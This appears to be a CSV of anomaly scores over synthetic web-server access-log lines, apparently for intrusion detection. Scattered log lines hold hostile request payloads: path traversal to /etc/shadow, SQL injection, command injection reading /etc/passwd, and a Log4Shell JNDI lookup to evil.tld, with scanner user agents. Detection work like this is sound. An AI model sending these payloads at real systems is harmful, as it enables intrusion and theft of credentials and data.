score_content,score_session,score_fused,score_fused_norm,line
76.36678314208984,,76.36678314208984,76.36678314208984,242.180.136.170 - - [10/Jan/2025:12:00:42 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 7216 "https://www.google.com/" "sqlmap/1.7.2#stable"
47.68771743774414,,47.68771743774414,47.68771743774414,235.12.66.108 - - [10/Jan/2025:12:00:42 +0000] "HEAD /dashboard HTTP/1.1" 200 9650 "https://example.com/" "sqlmap/1.7.2#stable"
126.695556640625,,126.695556640625,126.695556640625,71.9.225.83 - - [10/Jan/2025:12:00:42 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 17682 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
98.05510711669922,,98.05510711669922,98.05510711669922,44.154.97.250 - - [10/Jan/2025:12:00:45 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 302 11379 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
52.40057373046875,,52.40057373046875,52.40057373046875,204.135.126.174 - - [10/Jan/2025:12:00:45 +0000] "DELETE /search?q=ssd HTTP/1.1" 301 6926 "https://twitter.com/" "dirb/2.22"
26.494279861450195,,26.494279861450195,26.494279861450195,46.20.67.85 - - [10/Jan/2025:12:00:48 +0000] "POST /search?q=router HTTP/1.1" 200 12838 "https://example.com/" "curl/7.85.0"
1.977442979812622,,1.977442979812622,1.977442979812622,34.90.174.106 - - [10/Jan/2025:12:00:50 +0000] "GET /login HTTP/1.1" 200 6204 "https://twitter.com/" "curl/7.85.0"
49.387794494628906,,49.387794494628906,49.387794494628906,172.112.142.5 - - [10/Jan/2025:12:00:50 +0000] "DELETE /search?q=monitor HTTP/1.1" 204 11488 "-" "python-requests/2.31.0"
52.313621520996094,,52.313621520996094,52.313621520996094,16.240.147.61 - - [10/Jan/2025:12:00:53 +0000] "DELETE /search?q=monitor HTTP/1.1" 302 3473 "https://www.google.com/" "curl/7.85.0"
30110.939453125,,30110.939453125,30110.939453125,150.245.134.158 - - [10/Jan/2025:12:00:53 +0000] "GET /index.html HTTP/1.1" 401 93 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.759599685668945,,4.759599685668945,4.759599685668945,241.88.235.79 - - [10/Jan/2025:12:00:55 +0000] "POST /dashboard HTTP/1.1" 200 10064 "https://example.com/" "dirb/2.22"
126.60848999023438,,126.60848999023438,126.60848999023438,112.109.103.59 - - [10/Jan/2025:12:00:56 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 3403 "-" "curl/7.85.0"
35.10084533691406,,35.10084533691406,35.10084533691406,193.153.151.88 - - [10/Jan/2025:12:00:57 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8857 "https://news.ycombinator.com/" "nikto/2.5.0"
71.77780151367188,,71.77780151367188,71.77780151367188,8.164.74.146 - - [10/Jan/2025:12:00:58 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 14484 "https://twitter.com/" "dirb/2.22"
4.8519511222839355,,4.8519511222839355,4.8519511222839355,130.159.68.149 - - [10/Jan/2025:12:01:01 +0000] "GET /profile HTTP/1.1" 302 7735 "https://example.com/" "nikto/2.5.0"
30134.34375,,30134.34375,30134.34375,81.173.119.104 - - [10/Jan/2025:12:01:04 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1493 "https://twitter.com/" "python-requests/2.31.0"
98.01237487792969,,98.01237487792969,98.01237487792969,123.219.188.244 - - [10/Jan/2025:12:01:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 301 6256 "https://example.com/" "python-requests/2.31.0"
126.6800537109375,,126.6800537109375,126.6800537109375,139.120.152.142 - - [10/Jan/2025:12:01:05 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 13104 "https://news.ycombinator.com/" "dirb/2.22"
11066.4150390625,,11066.4150390625,11066.4150390625,100.88.28.217 - - [10/Jan/2025:12:01:05 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 502 1262 "https://www.google.com/" "python-requests/2.31.0"
0.24039912223815918,,0.24039912223815918,0.24039912223815918,217.85.28.128 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.js HTTP/1.1" 200 7290 "-" "python-requests/2.31.0"
4.808105945587158,,4.808105945587158,4.808105945587158,50.130.202.112 - - [10/Jan/2025:12:01:06 +0000] "POST /contact HTTP/1.1" 204 7662 "-" "dirb/2.22"
0.2585817575454712,,0.2585817575454712,0.2585817575454712,187.3.92.144 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.css HTTP/1.1" 201 18763 "https://twitter.com/" "nikto/2.5.0"
48.995323181152344,,48.995323181152344,48.995323181152344,87.138.138.244 - - [10/Jan/2025:12:01:06 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 304 4457 "https://example.com/" "nikto/2.5.0"
27.695650100708008,,27.695650100708008,27.695650100708008,9.243.52.194 - - [10/Jan/2025:12:01:09 +0000] "DELETE /contact HTTP/1.1" 200 1444 "https://example.com/" "python-requests/2.31.0"
0.20934677124023438,,0.20934677124023438,0.20934677124023438,25.136.36.93 - - [10/Jan/2025:12:01:09 +0000] "GET /assets/app.css HTTP/1.1" 200 5729 "-" "python-requests/2.31.0"
49.35308837890625,,49.35308837890625,49.35308837890625,111.178.229.50 - - [10/Jan/2025:12:01:10 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 903 "https://news.ycombinator.com/" "python-requests/2.31.0"
73.58106231689453,,73.58106231689453,73.58106231689453,223.254.135.66 - - [10/Jan/2025:12:01:12 +0000] "OPTIONS /login HTTP/1.1" 200 18396 "https://example.com/" "curl/7.85.0"
129.50906372070312,,129.50906372070312,129.50906372070312,34.111.191.72 - - [10/Jan/2025:12:01:14 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 15098 "https://twitter.com/" "nikto/2.5.0"
104.94573211669922,,104.94573211669922,104.94573211669922,157.81.125.193 - - [10/Jan/2025:12:01:15 +0000] "TRACE /profile HTTP/1.1" 200 19274 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30215.05078125,,30215.05078125,30215.05078125,220.205.69.97 - - [10/Jan/2025:12:01:16 +0000] "TRACE /logout HTTP/1.1" 403 346 "https://example.com/" "curl/7.85.0"
13.36843490600586,,13.36843490600586,13.36843490600586,116.224.60.221 - - [10/Jan/2025:12:01:17 +0000] "PUT /dashboard HTTP/1.1" 200 12291 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
69.4256591796875,,69.4256591796875,69.4256591796875,37.174.77.174 - - [10/Jan/2025:12:01:20 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 6819 "https://news.ycombinator.com/" "nikto/2.5.0"
73.49456024169922,,73.49456024169922,73.49456024169922,133.82.198.31 - - [10/Jan/2025:12:01:20 +0000] "OPTIONS /logout HTTP/1.1" 200 5747 "-" "sqlmap/1.7.2#stable"
95.32373046875,,95.32373046875,95.32373046875,49.184.236.219 - - [10/Jan/2025:12:01:21 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16491 "https://example.com/" "python-requests/2.31.0"
3.239433526992798,,3.239433526992798,3.239433526992798,137.90.253.223 - - [10/Jan/2025:12:01:24 +0000] "POST /.git/config HTTP/1.1" 200 18954 "https://twitter.com/" "dirb/2.22"
104.84896850585938,,104.84896850585938,104.84896850585938,29.225.147.74 - - [10/Jan/2025:12:01:27 +0000] "TRACE /dashboard HTTP/1.1" 200 10110 "-" "dirb/2.22"
72.39569854736328,,72.39569854736328,72.39569854736328,191.33.122.78 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=phone HTTP/1.1" 302 7368 "https://twitter.com/" "dirb/2.22"
30.62800407409668,,30.62800407409668,30.62800407409668,89.121.163.18 - - [10/Jan/2025:12:01:30 +0000] "DELETE /dashboard HTTP/1.1" 302 12656 "https://example.com/" "nikto/2.5.0"
69.42607116699219,,69.42607116699219,69.42607116699219,107.227.234.28 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 14954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
129.50845336914062,,129.50845336914062,129.50845336914062,221.84.63.83 - - [10/Jan/2025:12:01:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 14920 "https://twitter.com/" "python-requests/2.31.0"
38.021728515625,,38.021728515625,38.021728515625,1.34.25.91 - - [10/Jan/2025:12:01:30 +0000] "PUT /api/product?id=123 HTTP/1.1" 302 1142 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30123.568359375,,30123.568359375,30123.568359375,37.142.46.249 - - [10/Jan/2025:12:01:32 +0000] "PUT /login HTTP/1.1" 400 1115 "-" "python-requests/2.31.0"
69.46176147460938,,69.46176147460938,69.46176147460938,237.128.112.63 - - [10/Jan/2025:12:01:33 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 2944 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.06990051269531,,35.06990051269531,35.06990051269531,186.226.47.60 - - [10/Jan/2025:12:01:36 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2563 "https://twitter.com/" "sqlmap/1.7.2#stable"
30205.794921875,,30205.794921875,30205.794921875,254.41.82.225 - - [10/Jan/2025:12:01:36 +0000] "OPTIONS /search?q=phone HTTP/1.1" 403 267 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30214.8125,,30214.8125,30214.8125,173.99.29.63 - - [10/Jan/2025:12:01:37 +0000] "TRACE /api/products HTTP/1.1" 401 1388 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.820409774780273,,7.820409774780273,7.820409774780273,84.208.23.221 - - [10/Jan/2025:12:01:39 +0000] "POST /logout HTTP/1.1" 302 15714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11115.98046875,,11115.98046875,11115.98046875,131.197.29.254 - - [10/Jan/2025:12:01:42 +0000] "OPTIONS /about HTTP/1.1" 500 52 "https://www.google.com/" "sqlmap/1.7.2#stable"
95.19467163085938,,95.19467163085938,95.19467163085938,56.212.81.60 - - [10/Jan/2025:12:01:45 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 189 "https://twitter.com/" "sqlmap/1.7.2#stable"
126.58728790283203,,126.58728790283203,126.58728790283203,77.218.213.222 - - [10/Jan/2025:12:01:45 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 4976 "https://news.ycombinator.com/" "curl/7.85.0"
30112.150390625,,30112.150390625,30112.150390625,221.201.234.229 - - [10/Jan/2025:12:01:47 +0000] "GET /profile HTTP/1.1" 400 183 "https://www.google.com/" "curl/7.85.0"
0.3114299476146698,,0.3114299476146698,0.3114299476146698,182.67.210.141 - - [10/Jan/2025:12:01:47 +0000] "GET /index.html HTTP/1.1" 200 5461 "https://www.google.com/" "curl/7.85.0"
13.337347984313965,,13.337347984313965,13.337347984313965,81.124.182.242 - - [10/Jan/2025:12:01:49 +0000] "PUT /api/products HTTP/1.1" 200 8966 "-" "nikto/2.5.0"
73.41313934326172,,73.41313934326172,73.41313934326172,168.20.19.73 - - [10/Jan/2025:12:01:52 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9550 "https://example.com/" "nikto/2.5.0"
29.453296661376953,,29.453296661376953,29.453296661376953,52.171.215.10 - - [10/Jan/2025:12:01:54 +0000] "POST /search?q=laptop HTTP/1.1" 304 6329 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.810302734375,,47.810302734375,47.810302734375,114.142.235.126 - - [10/Jan/2025:12:01:56 +0000] "HEAD /login HTTP/1.1" 200 6725 "-" "curl/7.85.0"
26.386634826660156,,26.386634826660156,26.386634826660156,104.19.206.95 - - [10/Jan/2025:12:01:57 +0000] "DELETE /.env HTTP/1.1" 200 17568 "-" "python-requests/2.31.0"
23.606834411621094,,23.606834411621094,23.606834411621094,168.110.83.167 - - [10/Jan/2025:12:02:00 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7518 "https://example.com/" "python-requests/2.31.0"
23.606264114379883,,23.606264114379883,23.606264114379883,194.152.37.83 - - [10/Jan/2025:12:02:02 +0000] "GET /search?q=camera HTTP/1.1" 200 16915 "https://twitter.com/" "nikto/2.5.0"
14.742791175842285,,14.742791175842285,14.742791175842285,9.45.189.230 - - [10/Jan/2025:12:02:03 +0000] "PUT /wp-login.php HTTP/1.1" 301 19361 "https://news.ycombinator.com/" "dirb/2.22"
23.579423904418945,,23.579423904418945,23.579423904418945,244.193.111.240 - - [10/Jan/2025:12:02:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 14815 "https://twitter.com/" "dirb/2.22"
0.2578403949737549,,0.2578403949737549,0.2578403949737549,154.233.37.95 - - [10/Jan/2025:12:02:07 +0000] "GET /assets/app.js HTTP/1.1" 200 11289 "https://www.google.com/" "python-requests/2.31.0"
76.34730529785156,,76.34730529785156,76.34730529785156,240.118.111.197 - - [10/Jan/2025:12:02:09 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 17902 "https://twitter.com/" "sqlmap/1.7.2#stable"
46.02908706665039,,46.02908706665039,46.02908706665039,55.201.221.93 - - [10/Jan/2025:12:02:10 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 9260 "https://www.google.com/" "dirb/2.22"
126.47010040283203,,126.47010040283203,126.47010040283203,182.212.114.163 - - [10/Jan/2025:12:02:13 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6958 "https://news.ycombinator.com/" "dirb/2.22"
2.2215166091918945,,2.2215166091918945,2.2215166091918945,238.198.70.167 - - [10/Jan/2025:12:02:13 +0000] "GET / HTTP/1.1" 200 14459 "https://www.google.com/" "dirb/2.22"
69.45307159423828,,69.45307159423828,69.45307159423828,169.218.186.149 - - [10/Jan/2025:12:02:15 +0000] "HEAD /search?q=router HTTP/1.1" 200 17171 "https://example.com/" "sqlmap/1.7.2#stable"
11090.27734375,,11090.27734375,11090.27734375,153.167.69.247 - - [10/Jan/2025:12:02:17 +0000] "HEAD /profile HTTP/1.1" 503 53 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.24049769341945648,,0.24049769341945648,0.24049769341945648,38.36.142.18 - - [10/Jan/2025:12:02:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12845 "-" "Wget/1.21.2 (linux-gnu)"
69.43425750732422,,69.43425750732422,69.43425750732422,251.44.246.154 - - [10/Jan/2025:12:02:20 +0000] "HEAD /search?q=router HTTP/1.1" 200 11820 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
50.70716857910156,,50.70716857910156,50.70716857910156,91.246.58.18 - - [10/Jan/2025:12:02:20 +0000] "HEAD /profile HTTP/1.1" 304 1356 "https://example.com/" "curl/7.85.0"
69.34770202636719,,69.34770202636719,69.34770202636719,152.252.137.21 - - [10/Jan/2025:12:02:22 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3070 "-" "nikto/2.5.0"
11115.89453125,,11115.89453125,11115.89453125,11.132.174.100 - - [10/Jan/2025:12:02:23 +0000] "OPTIONS /contact HTTP/1.1" 502 807 "https://news.ycombinator.com/" "curl/7.85.0"
0.20860503613948822,,0.20860503613948822,0.20860503613948822,61.91.41.56 - - [10/Jan/2025:12:02:23 +0000] "GET /assets/app.js HTTP/1.1" 204 1559 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
38.20037078857422,,38.20037078857422,38.20037078857422,163.106.69.143 - - [10/Jan/2025:12:02:25 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 5364 "-" "nikto/2.5.0"
6.045429706573486,,6.045429706573486,6.045429706573486,150.89.83.93 - - [10/Jan/2025:12:02:28 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 4775 "https://example.com/" "sqlmap/1.7.2#stable"
27.753955841064453,,27.753955841064453,27.753955841064453,22.110.83.149 - - [10/Jan/2025:12:02:28 +0000] "DELETE /logout HTTP/1.1" 200 6717 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.737945556640625,,27.737945556640625,27.737945556640625,45.104.57.241 - - [10/Jan/2025:12:02:29 +0000] "DELETE /contact HTTP/1.1" 200 10948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.810964584350586,,1.810964584350586,1.810964584350586,195.12.2.254 - - [10/Jan/2025:12:02:32 +0000] "GET /phpmyadmin HTTP/1.1" 200 6372 "https://twitter.com/" "curl/7.85.0"
35.07783508300781,,35.07783508300781,35.07783508300781,38.48.36.5 - - [10/Jan/2025:12:02:34 +0000] "PUT /search?q=router HTTP/1.1" 200 6496 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
52.391422271728516,,52.391422271728516,52.391422271728516,232.63.41.108 - - [10/Jan/2025:12:02:35 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 7613 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.358339309692383,,26.358339309692383,26.358339309692383,148.197.254.196 - - [10/Jan/2025:12:02:38 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 316 "https://example.com/" "dirb/2.22"
29.44434928894043,,29.44434928894043,29.44434928894043,108.134.108.209 - - [10/Jan/2025:12:02:39 +0000] "POST /search?q=laptop HTTP/1.1" 301 19961 "-" "dirb/2.22"
13.425179481506348,,13.425179481506348,13.425179481506348,190.193.225.124 - - [10/Jan/2025:12:02:39 +0000] "PUT /logout HTTP/1.1" 204 4280 "https://example.com/" "dirb/2.22"
1.9082684516906738,,1.9082684516906738,1.9082684516906738,25.201.190.251 - - [10/Jan/2025:12:02:41 +0000] "GET /contact HTTP/1.1" 200 6766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.51402282714844,,50.51402282714844,50.51402282714844,178.191.25.7 - - [10/Jan/2025:12:02:43 +0000] "HEAD /server-status HTTP/1.1" 302 6399 "https://www.google.com/" "dirb/2.22"
1.7247933149337769,,1.7247933149337769,1.7247933149337769,89.67.167.165 - - [10/Jan/2025:12:02:45 +0000] "GET /server-status HTTP/1.1" 200 493 "https://twitter.com/" "nikto/2.5.0"
0.23898468911647797,,0.23898468911647797,0.23898468911647797,11.19.113.41 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 12443 "https://example.com/" "python-requests/2.31.0"
